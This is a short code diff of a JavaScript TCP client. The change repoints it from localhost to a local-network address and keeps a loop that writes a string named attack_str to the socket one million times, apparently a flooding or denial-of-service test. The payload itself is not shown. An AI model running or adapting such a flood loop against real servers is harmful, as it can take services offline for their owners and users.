@@ -6,7 +6,7 @@ var i = 1000000;
 
 var client = net.connect({
 	port: 3000,
-	host: 'localhost'
+	host: "192.168.43.186"
 }, function() {
 	while(i--) {
 		client.write(attack_str);
